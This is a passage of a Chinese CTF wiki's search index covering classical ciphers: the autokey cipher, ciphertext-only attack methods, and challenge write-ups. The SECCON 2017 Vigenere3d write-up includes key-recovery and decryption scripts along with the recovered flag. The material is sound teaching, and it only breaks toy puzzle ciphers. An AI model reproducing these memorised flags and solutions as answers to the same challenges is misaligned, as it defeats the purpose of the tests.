\u3002","title":"\u4f8b\u5b50"},{"location":"crypto/classical/polyalphabetic/#autokeycipher","text":"","title":"AutokeyCipher"},{"location":"crypto/classical/polyalphabetic/#_14","text":"\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\uff08Autokey Cipher\uff09\u4e5f\u662f\u591a\u8868\u66ff\u6362\u5bc6\u7801\uff0c\u4e0e\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4f46\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u751f\u6210\u5bc6\u94a5\u3002\u901a\u5e38\u6765\u8bf4\u5b83\u8981\u6bd4\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u66f4\u5b89\u5168\u3002\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u4e3b\u8981\u6709\u4e24\u79cd\uff0c\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u548c\u539f\u6587\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u3002\u4e0b\u9762\u6211\u4eec\u4ee5\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u4e3a\u4f8b\uff1a \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG \u5173\u952e\u8bcd\uff1aCULTURE \u81ea\u52a8\u751f\u6210\u5bc6\u94a5\uff1a CULTURE THE QUICK BROWN FOX JUMPS OVER THE \u63a5\u4e0b\u6765\u7684\u52a0\u5bc6\u8fc7\u7a0b\u548c\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4ece\u76f8\u5e94\u7684\u8868\u683c\u53ef\u5f97\uff1a \u5bc6\u6587 VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_15","text":"\u5df2\u77e5\u5173\u952e\u8bcd Python \u7684 pycipher \u5e93 \u672a\u77e5\u5173\u952e\u8bcd http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ tools \u6587\u4ef6\u5939\u4e0b break_autokey.py\uff0c\u5f85\u5b8c\u6210\u3002","title":"\u5de5\u5177"},{"location":"crypto/classical/summary/","text":"\u603b\u7ed3 \u00b6 \u53e4\u5178\u5bc6\u7801\u5206\u6790\u601d\u8def \u00b6 CTF \u4e2d\u6709\u5173\u53e4\u5178\u5bc6\u7801\u7684\u9898\u76ee\uff0c\u901a\u5e38\u662f\u6839\u636e\u5bc6\u6587\u6c42\u51fa\u660e\u6587\uff0c\u56e0\u6b64\u91c7\u7528 \u552f\u5bc6\u6587\u653b\u51fb \u5c45\u591a\uff0c\u57fa\u672c\u5206\u6790\u601d\u8def\u603b\u7ed3\u5982\u4e0b\uff1a \u786e\u5b9a\u5bc6\u7801\u7c7b\u578b\uff1a\u6839\u636e\u9898\u76ee\u63d0\u793a\u3001\u52a0\u5bc6\u65b9\u5f0f\u3001\u5bc6\u6587\u5b57\u7b26\u96c6\u3001\u5bc6\u6587\u5c55\u73b0\u5f62\u5f0f\u7b49\u4fe1\u606f\u3002 \u786e\u5b9a\u653b\u51fb\u65b9\u6cd5\uff1a\u5305\u62ec\u76f4\u63a5\u5206\u6790\u3001\u86ee\u529b\u653b\u51fb\u3001\u7edf\u8ba1\u5206\u6790\u7b49\u65b9\u6cd5\u3002\u5bf9\u4e8e\u65e0\u6cd5\u786e\u5b9a\u7c7b\u578b\u7684\u7279\u6b8a\u5bc6\u7801\uff0c\u5e94\u6839\u636e\u5176\u5bc6\u7801\u7279\u6027\u9009\u7528\u5408\u9002\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u786e\u5b9a\u5206\u6790\u5de5\u5177\uff1a\u4ee5\u5728\u7ebf\u5bc6\u7801\u5206\u6790\u5de5\u5177\u4e0e Python \u811a\u672c\u5de5\u5177\u5305\u4e3a\u4e3b\uff0c\u4ee5\u79bb\u7ebf\u5bc6\u7801\u5206\u6790\u5de5\u5177\u4e0e\u624b\u5de5\u5206\u6790\u4e3a\u8f85\u3002 \u4ee5\u4e0a\u552f\u5bc6\u6587\u653b\u51fb\u65b9\u6cd5\u7684\u9002\u7528\u573a\u666f\u4e0e\u4e3e\u4f8b\u5982\u4e0b\uff1a \u653b\u51fb\u65b9\u6cd5 \u9002\u7528\u573a\u666f \u4e3e\u4f8b \u76f4\u63a5\u5206\u6790\u6cd5 \u7531\u5bc6\u7801\u7c7b\u578b\u53ef\u786e\u5b9a\u6620\u5c04\u5173\u7cfb\u7684\u4ee3\u6362\u5bc6\u7801 \u51ef\u6492\u5bc6\u7801\u3001\u732a\u5708\u5bc6\u7801\u3001\u952e\u76d8\u5bc6\u7801\u7b49 \u86ee\u529b\u653b\u51fb\u6cd5 \u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u4ee3\u6362\u5bc6\u7801\u6216\u7f6e\u6362\u5bc6\u7801 \u79fb\u4f4d\u5bc6\u7801\u3001\u6805\u680f\u5bc6\u7801\u7b49 \u7edf\u8ba1\u5206\u6790\u6cd5 \u5bc6\u94a5\u7a7a\u95f4\u8f83\u5927\u7684\u4ee3\u6362\u5bc6\u7801 \u7b80\u5355\u66ff\u6362\u5bc6\u7801\u3001\u4eff\u5c04\u5bc6\u7801\u3001\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7b49 \u5b9e\u9a8c\u5427 \u56f4\u5728\u6805\u680f\u91cc\u7684\u7231 \u00b6 \u9898\u76ee\u63cf\u8ff0 \u6700\u8fd1\u4e00\u76f4\u5728\u597d\u5947\u4e00\u4e2a\u95ee\u9898\uff0cQWE \u5230\u5e95\u7b49\u4e0d\u7b49\u4e8e ABC\uff1f -.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- flag\u683c\u5f0f\uff1aCTF{xxx} \u9996\u5148\uff0c\u6839\u636e\u5bc6\u7801\u6837\u5f0f\u5224\u65ad\u662f\u6469\u65af\u7535\u7801\uff0c\u89e3\u5bc6\u540e\u5f97\u5230 KIQLWTFCQGNSOO \uff0c\u770b\u7740\u4e5f\u4e0d\u50cf flag\uff0c\u9898\u76ee\u4e2d\u8fd8\u6709\u8fd8\u6709\u6805\u680f\u4e0e QWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC \uff0c\u4e24\u4e2a\u90fd\u8bd5\u4e86\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u662f\u5148 QWE \u7136\u540e\u6805\u680f\u53ef\u5f97\u5230\u7ed3\u679c\u3002 \u9996\u5148\u952e\u76d8 QWE \u89e3\u5bc6\uff0c\u8bd5\u7740\u89e3\u5bc6\u5f97\u5230 IILYOAVNEBSAHR \u3002\u7ee7\u800c\u6805\u680f\u89e3\u5bc6\u5f97\u5230 ILOVESHIYANBAR \u3002 2017 SECCON Vigenere3d \u00b6 \u7a0b\u5e8f\u5982\u4e0b # Vigenere3d.py import sys def _l ( idx , s ): return s [ idx :] + s [: idx ] def main ( p , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 c = \"\" for a in p : c += t [ s . find ( a )][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] i1 = ( i1 + 1 ) % len ( k1 ) i2 = ( i2 + 1 ) % len ( k2 ) return c print main ( sys . argv [ 1 ], sys . argv [ 2 ], sys . argv [ 2 ][:: - 1 ]) $ python Vigenere3d . py SECCON { ************************** } ************** POR4dnyTLHBfwbxAAZhe }} ocZR3Cxcftw9 \u89e3\u6cd5\u4e00 \uff1a \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b t \u7684\u6784\u6210 $$ t[i][j]=s[i+j:]+s[:i+j] \\ t[i][k]=s[i+k:]+s[:i+k] $$ t[i][j][k] t[i][j][k] \u4e3a t[i][j] t[i][j] \u4e2d\u7684\u7b2c k \u4e2a\u5b57\u7b26\uff0c t[i][k][j] t[i][k][j] \u4e3a t[i][k] t[i][k] \u4e2d\u7684\u7b2c j \u4e2a\u5b57\u7b26\u3002\u65e0\u8bba\u662f i+j+k i+j+k \u662f\u5426\u8d85\u8fc7 len(s) \u4e24\u8005\u90fd\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\uff0c\u5373 t[i][j][k]=t[i][k][j] t[i][j][k]=t[i][k][j] \u3002 \u6545\u800c\uff0c\u5176\u5b9e\u5bf9\u4e8e\u76f8\u540c\u7684\u660e\u6587\u6765\u8bf4\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u5bc6\u94a5\u4f7f\u5176\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u3002 \u7136\u800c\u4e0a\u9762\u5206\u6790\u5c31\u662f\u5355\u7eaf\u5730\u5206\u6790\u800c\u5df2\uff0c\uff0c\u4e0b\u9762\u5f00\u59cb\u6b63\u9898\u3002 \u4e0d\u96be\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u6bcf\u4e00\u4f4d\u53ea\u4e0e\u660e\u6587\u7684\u76f8\u5e94\u4f4d\u76f8\u5173\uff0c\u800c\u4e14\uff0c\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u7684\u7a7a\u95f4\u6700\u5927\u4e5f\u5c31\u662f s \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7206\u7834\u6765\u83b7\u53d6\u5bc6\u94a5\u3002\u8fd9\u91cc\u6839\u636e\u4e0a\u8ff0\u547d\u4ee4\u884c\u63d0\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u5bc6\u94a5\u957f\u5ea6\u4e3a 14\uff0c\u6070\u597d\u660e\u6587\u524d\u97627\u4e2a\u5b57\u8282\u5df2\u77e5\u3002\u6062\u590d\u5bc6\u94a5\u7684 exp \u5982\u4e0b def get_key ( plain , cipher ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 key = [ '*' ] * 14 for i in range ( len ( plain )): for i1 in range ( len ( s )): for i2 in range ( len ( s )): if t [ s . find ( plain [ i ])][ s . find ( s [ i1 ])][ s . find ( s [ i2 ])] == cipher [ i ]: key [ i ] = s [ i1 ] key [ 13 - i ] = s [ i2 ] return '' . join ( key ) \u6062\u590d\u660e\u6587\u7684\u811a\u672c\u5982\u4e0b def decrypt ( cipher , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 plain = \"\" for a in cipher : for i in range ( len ( s )): if t [ i ][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] == a : plain += s [ i ] break i1 = ( i1 + 1 ) % len ( k1 ) i2 = ( i2 + 1 ) % len ( k2 ) return plain \u5f97\u5230\u660e\u6587\u5982\u4e0b \u279c 2017_seccon_vigenere3d git: ( master ) python exp.py SECCON { Welc0me_to_SECCON_CTF_2017 } \u89e3\u6cd5\u4e8c \u5173\u4e8e\u6b64\u9898\u7684\u5206\u6790\uff1a \u8003\u8651\u5230\u5728\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c\u4e0b\uff0c\u6570\u7ec4\u8bbf\u95ee\u4e0d\u4f1a\u8d8a\u754c\uff0c\u6211\u4eec\u5728\u8ba8\u8bba\u65f6\u505a\u4ee5\u4e0b\u7ea6\u5b9a\uff1a arr[index] \\Leftrightarrow arr[index \\% len(arr)] arr[index] \\Leftrightarrow arr[index \\% len(arr)] \u5173\u4e8e python \u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u7684 _l \u51fd\u6570\uff0c\u53d1\u73b0\u4ee5\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1a \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset] \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset] \u5173\u4e8e python \u7684 main \u51fd\u6570\u4e2d\u4e09\u7ef4\u77e9\u9635 t \u7684\u5b9a\u4e49\uff0c\u53d1\u73b0\u4ee5\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1a t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c] t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c] \u7efc\u5408\u7b2c 2 \u7b2c 3 \u70b9\u7684\u89c2\u5bdf\uff0c\u6709\u5982\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1a t[a][b][c] \\Leftrightarrow s[a+b+c] t[a][b][c] \\Leftrightarrow s[a+b+c] \u6211\u4eec\u5c06 s \u89c6\u4e3a\u4e00\u79cd\u7f16\u7801\u683c\u5f0f\uff0c\u5373\uff1a\u7f16\u7801\u8fc7\u7a0b s.find(x)\uff0c\u89e3\u7801\u8fc7\u7a0b s[x]\u3002\u5e76\u76f4\u63a5\u4f7f\u7528\u5176\u7f16\u7801\u7ed3\u679c\u7684\u6570\u5b57\u66ff\u4ee3\u5176\u6240\u4ee3\u6307\u7684\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u52a0\u5bc6\u8fc7\u7a0b\u53ef\u4ee5\u7528\u4ee5\u4e0b\u516c\u5f0f\u8868\u793a\uff1a e = f + k1 +k2 e = f + k1 +k2 \u5176\u4e2d\uff0ce \u662f\u5bc6\u6587\uff0cf \u662f\u660e\u6587\uff0ck1 \u4e0e k2 \u662f\u901a\u8fc7\u590d\u5236\u65b9\u6cd5\u5f97\u5230\u3001\u4e0e f \u957f\u5ea6\u4e00\u6837\u7684\u5bc6\u94a5\uff0c \u52a0\u6cd5\u662f\u5411\u91cf\u52a0 \u3002 \u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u8ba1\u7b97 k1+k2 \uff0c\u6a21\u62df\u5bc6\u94a5\uff0c\u5373\u53ef\u89e3\u5bc6\u3002\u5173\u4e8e\u6b64\u9898\u7684\u89e3\u5bc6 python \u811a\u672c\uff1a # exp2.py enc_str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} ' dec_dic = { k : v for v , k in enumerate ( enc_str )} encrypt = 'POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9' flag_bg = 'SECCON{**************************}' sim_key = [ dec_dic [ encrypt [ i ]] - dec_dic [ flag_bg [ i ]] for i in range ( 7 )] # \u7834\u89e3\u6a21\u62df\u5bc6\u94a5 sim_key = sim_key + sim_key [:: - 1 ] flag_ed = [ dec_dic [ v ] - sim_key [ k % 14 ] for k , v in enumerate ( encrypt )] # \u6a21\u62df\u5bc6\u94a5\u89e3\u5bc6 flag_ed = '' . join ([ enc_str [ i % len ( enc_str )] for i in flag_ed ]) # \u89e3\u7801 print ( flag_ed ) \u5f97\u5230\u660e\u6587\u5982\u4e0b\uff1a $ python exp2.py SECCON { Welc0me_to_SECCON_CTF_2017 } \u6d88\u5931\u7684\u4e09\u91cd\u5bc6\u7801 \u00b6 \u5bc6\u6587 of zit kggd zitkt qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz zg hxz zitd of gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl:hstqlt eiqfut zit ygkd gy zit fxdwtk ngx utz.zit hkgukqddtkl! \u4f7f\u7528 quipquip \u76f4\u63a5\u89e3\u5bc6\u3002","title":"\u603b\u7ed3"},{"location":"crypto/classical/summary/#_1","text":"","title":"\u603b\u7ed3"},{"location":"crypto/classical/summary/#_2","text":"CTF \u4e2d\u6709\u5173\u53e4\u5178\u5bc6\u7801\u7684\u9898\u76ee\uff0c\u901a\u5e38\u662f\u6839\u636e\u5bc6\u6587\u6c42\u51fa\u660e\u6587\uff0c\u56e0\u6b64\u91c7\u7528 \u552f\u5bc6\u6587\u653b\u51fb \u5c45\u591a\uff0c\u57fa\u672c\u5206\u6790\u601d\u8def\u603b\u7ed3\u5982\u4e0b\uff1a \u786e\u5b9a\u5bc6\u7801\u7c7b\u578b\uff1a\u6839\u636e\u9898\u76ee\u63d0\u793a\u3001\u52a0\u5bc6\u65b9\u5f0f\u3001\u5bc6\u6587\u5b57\u7b26\u96c6\u3001\u5bc6\u6587\u5c55\u73b0\u5f62\u5f0f\u7b49\u4fe1\u606f\u3002 \u786e\u5b9a\u653b\u51fb\u65b9\u6cd5\uff1a\u5305\u62ec\u76f4\u63a5\u5206\u6790\u3001\u86ee\u529b\u653b\u51fb\u3001\u7edf\u8ba1\u5206\u6790\u7b49\u65b9\u6cd5\u3002\u5bf9\u4e8e\u65e0\u6cd5\u786e\u5b9a\u7c7b\u578b\u7684\u7279\u6b8a\u5bc6\u7801\uff0c\u5e94\u6839\u636e\u5176\u5bc6\u7801\u7279\u6027\u9009\u7528\u5408\u9002\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u786e\u5b9a\u5206\u6790\u5de5\u5177\uff1a\u4ee5\u5728\u7ebf\u5bc6\u7801\u5206\u6790\u5de5\u5177\u4e0e Python \u811a\u672c\u5de5\u5177\u5305\u4e3a\u4e3b\uff0c\u4ee5\u79bb\u7ebf\u5bc6\u7801\u5206\u6790\u5de5\u5177\u4e0e\u624b\u5de5\u5206\u6790\u4e3a\u8f85\u3002 \u4ee5\u4e0a\u552f\u5bc6\u6587\u653b\u51fb\u65b9\u6cd5\u7684\u9002\u7528\u573a\u666f\u4e0e\u4e3e\u4f8b\u5982\u4e0b\uff1a \u653b\u51fb\u65b9\u6cd5 \u9002\u7528\u573a\u666f \u4e3e\u4f8b \u76f4\u63a5\u5206\u6790\u6cd5 \u7531\u5bc6\u7801\u7c7b\u578b\u53ef\u786e\u5b9a\u6620\u5c04\u5173\u7cfb\u7684\u4ee3\u6362\u5bc6\u7801 \u51ef\u6492\u5bc6\u7801\u3001\u732a\u5708\u5bc6\u7801\u3001\u952e\u76d8\u5bc6\u7801\u7b49 \u86ee\u529b\u653b\u51fb\u6cd5 \u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u4ee3\u6362\u5bc6\u7801\u6216\u7f6e\u6362\u5bc6\u7801 \u79fb\u4f4d\u5bc6\u7801\u3001\u6805\u680f\u5bc6\u7801\u7b49 \u7edf\u8ba1\u5206\u6790\u6cd5 \u5bc6\u94a5\u7a7a\u95f4\u8f83\u5927\u7684\u4ee3\u6362\u5bc6\u7801 \u7b80\u5355\u66ff\u6362\u5bc6\u7801\u3001\u4eff\u5c04\u5bc6\u7801\u3001\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7b49","title":"\u53e4\u5178\u5bc6\u7801\u5206\u6790\u601d\u8def"},{"location":"crypto/classical/summary/#_3","text":"\u9898\u76ee\u63cf\u8ff0 \u6700\u8fd1\u4e00\u76f4\u5728\u597d\u5947\u4e00\u4e2a\u95ee\u9898\uff0cQWE \u5230\u5e95\u7b49\u4e0d\u7b49\u4e8e ABC\uff1f -.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- flag\u683c\u5f0f\uff1aCTF{xxx} \u9996\u5148\uff0c\u6839\u636e\u5bc6\u7801\u6837\u5f0f\u5224\u65ad\u662f\u6469\u65af\u7535\u7801\uff0c\u89e3\u5bc6\u540e\u5f97\u5230 KIQLWTFCQGNSOO \uff0c\u770b\u7740\u4e5f\u4e0d\u50cf flag\uff0c\u9898\u76ee\u4e2d\u8fd8\u6709\u8fd8\u6709\u6805\u680f\u4e0e QWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC \uff0c\u4e24\u4e2a\u90fd\u8bd5\u4e86\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u662f\u5148 QWE \u7136\u540e\u6805\u680f\u53ef\u5f97\u5230\u7ed3\u679c\u3002 \u9996\u5148\u952e\u76d8 QWE \u89e3\u5bc6\uff0c\u8bd5\u7740\u89e3\u5bc6\u5f97\u5230 IILYOAVNEBSAHR \u3002\u7ee7\u800c\u6805\u680f\u89e3\u5bc6\u5f97\u5230 ILOVESHIYANBAR \u3002","title":"\u5b9e\u9a8c\u5427 \u56f4\u5728\u6805\u680f\u91cc\u7684\u7231"},{"location":"crypto/classical/summary/#2017-seccon-vigenere3d","text":"\u7a0b\u5e8f\u5982\u4e0b # Vigenere3d.py import sys def _l ( idx , s ): return s [ idx :] + s [: idx ] def main ( p , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 c = \"\" for a in p : c += t [ s . find ( a )][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] i1 = ( i1 + 1 ) % len ( k1 ) i2 = ( i2 + 1 ) % len ( k2 ) return c print main ( sys . argv [ 1 ], sys . argv [ 2 ], sys . argv [ 2 ][:: - 1 ]) $ python Vigenere3d . py SECCON { ************************** } ************** POR4dnyTLHBfwbxAAZhe }} ocZR3Cxcftw9 \u89e3\u6cd5\u4e00 \uff1a \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b t \u7684\u6784\u6210 $$ t[i][j]=s[i+j:]+s[:i+j] \\ t[i][k]=s[i+k:]+s[:i+k] $$ t[i][j][k] t[i][j][k] \u4e3a t[i][j] t[i][j] \u4e2d\u7684\u7b2c k \u4e2a\u5b57\u7b26\uff0c t[i][k][j] t[i][k][j] \u4e3a t[i][k] t[i][k] \u4e2d\u7684\u7b2c j \u4e2a\u5b57\u7b26\u3002\u65e0\u8bba\u662f i+j+k i+j+k \u662f\u5426\u8d85\u8fc7 len(s) \u4e24\u8005\u90fd\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\uff0c\u5373 t[i][j][k]=t[i][k][j] t[i][j][k]=t[i][k][j] \u3002 \u6545\u800c\uff0c\u5176\u5b9e\u5bf9\u4e8e\u76f8\u540c\u7684\u660e\u6587\u6765\u8bf4\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u5bc6\u94a5\u4f7f\u5176\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u3002 \u7136\u800c\u4e0a\u9762\u5206\u6790\u5c31\u662f\u5355\u7eaf\u5730\u5206\u6790\u800c\u5df2\uff0c\uff0c\u4e0b\u9762\u5f00\u59cb\u6b63\u9898\u3002 \u4e0d\u96be\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u6bcf\u4e00\u4f4d\u53ea\u4e0e\u660e\u6587\u7684\u76f8\u5e94\u4f4d\u76f8\u5173\uff0c\u800c\u4e14\uff0c\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u7684\u7a7a\u95f4\u6700\u5927\u4e5f\u5c31\u662f s \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7206\u7834\u6765\u83b7\u53d6\u5bc6\u94a5\u3002\u8fd9\u91cc\u6839\u636e\u4e0a\u8ff0\u547d\u4ee4\u884c\u63d0\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u5bc6\u94a5\u957f\u5ea6\u4e3a 14\uff0c\u6070\u597d\u660e\u6587\u524d\u97627\u4e2a\u5b57\u8282\u5df2\u77e5\u3002\u6062\u590d\u5bc6\u94a5\u7684 exp \u5982\u4e0b def get_key ( plain , cipher ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 key = [ '*' ] * 14 for i in range ( len ( plain )): for i1 in range ( len ( s )): for i2 in range ( len ( s )): if t [ s . find ( plain [ i ])][ s . find ( s [ i1 ])][ s . find ( s [ i2 ])] == cipher [ i ]: key [ i ] = s [ i1 ] key [ 13 - i ] = s [ i2 ] return '' . join ( key ) \u6062\u590d\u660e\u6587\u7684\u811a\u672c\u5982\u4e0b def decrypt ( cipher , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 plain = \"\" for a in cipher : for i in range ( len ( s )): if t [ i ][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] == a : plain += s [ i ] break i1 = ( i1 + 1 ) % len ( k1 ) i2 = ( i2 + 1 ) % len ( k2 ) return plain \u5f97\u5230\u660e\u6587\u5982\u4e0b \u279c 2017_seccon_vigenere3d git: ( master ) python exp.py SECCON { Welc0me_to_SECCON_CTF_2017 } \u89e3\u6cd5\u4e8c \u5173\u4e8e\u6b64\u9898\u7684\u5206\u6790\uff1a \u8003\u8651\u5230\u5728\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c\u4e0b\uff0c\u6570\u7ec4\u8bbf\u95ee\u4e0d\u4f1a\u8d8a\u754c\uff0c\u6211\u4eec\u5728\u8ba8\u8bba\u65f6\u505a\u4ee5\u4e0b\u7ea6\u5b9a\uff1a arr[index] \\Leftrightarrow arr[index \\% len(arr)] arr[index] \\Leftrightarrow arr[index \\% len(arr)] \u5173\u4e8e python \u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u7684 _l \u51fd\u6570\uff0c\u53d1\u73b0\u4ee5\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1a \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset] \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset] \u5173\u4e8e python \u7684 main \u51fd\u6570\u4e2d\u4e09\u7ef4\u77e9\u9635 t \u7684\u5b9a\u4e49\uff0c\u53d1\u73b0\u4ee5\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1a t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c] t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c] \u7efc\u5408\u7b2c 2 \u7b2c 3 \u70b9\u7684\u89c2\u5bdf\uff0c\u6709\u5982\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1a t[a][b][c] \\Leftrightarrow s[a+b+c] t[a][b][c] \\Leftrightarrow s[a+b+c] \u6211\u4eec\u5c06 s \u89c6\u4e3a\u4e00\u79cd\u7f16\u7801\u683c\u5f0f\uff0c\u5373\uff1a\u7f16\u7801\u8fc7\u7a0b s.find(x)\uff0c\u89e3\u7801\u8fc7\u7a0b s[x]\u3002\u5e76\u76f4\u63a5\u4f7f\u7528\u5176\u7f16\u7801\u7ed3\u679c\u7684\u6570\u5b57\u66ff\u4ee3\u5176\u6240\u4ee3\u6307\u7684\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u52a0\u5bc6\u8fc7\u7a0b\u53ef\u4ee5\u7528\u4ee5\u4e0b\u516c\u5f0f\u8868\u793a\uff1a e = f + k1 +k2 e = f + k1 +k2 \u5176\u4e2d\uff0ce \u662f\u5bc6\u6587\uff0cf \u662f\u660e\u6587\uff0ck1 \u4e0e k2 \u662f\u901a\u8fc7\u590d\u5236\u65b9\u6cd5\u5f97\u5230\u3001\u4e0e f \u957f\u5ea6\u4e00\u6837\u7684\u5bc6\u94a5\uff0c \u52a0\u6cd5\u662f\u5411\u91cf\u52a0 \u3002 \u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u8ba1\u7b97 k1+k2 \uff0c\u6a21\u62df\u5bc6\u94a5\uff0c\u5373\u53ef\u89e3\u5bc6\u3002\u5173\u4e8e\u6b64\u9898\u7684\u89e3\u5bc6 python \u811a\u672c\uff1a # exp2.py enc_str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} ' dec_dic = { k : v for v , k in enumerate ( enc_str )} encrypt = 'POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9' flag_bg = 'SECCON{**************************}' sim_key = [ dec_dic [ encrypt [ i ]] - dec_dic [ flag_bg [ i ]] for i in range ( 7 )] # \u7834\u89e3\u6a21\u62df\u5bc6\u94a5 sim_key = sim_key + sim_key [:: - 1 ] flag_ed = [ dec_dic [ v ] - sim_key [ k % 14 ] for k , v in enumerate ( encrypt )] # \u6a21\u62df\u5bc6\u94a5\u89e3\u5bc6 flag_ed = '' . join ([ enc_str [ i % len ( enc_str )] for i in flag_ed ]) # \u89e3\u7801 print ( flag_ed ) \u5f97\u5230\u660e\u6587\u5982\u4e0b\uff1a $ python exp2.py SECCON { Welc0me_to_SECCON_CTF_2017 }","title":"2017 SECCON Vigenere3d"},{"location":"crypto/classical/summary/#_4","text":"\u5bc6\u6587 of zit kggd zitkt qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz zg hxz zitd of gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl:hstqlt eiqfut zit ygkd gy zit fxdwtk ngx utz.zit hkgukqddtkl! \u4f7f\u7528 quipquip \u76f4\u63a5\u89e3\u5bc6\u3002","title":"\u6d88\u5931\u7684\u4e09\u91cd\u5bc6\u7801"},{"location":"crypto/hash/attack/","text":"Hash Attack \u00b6 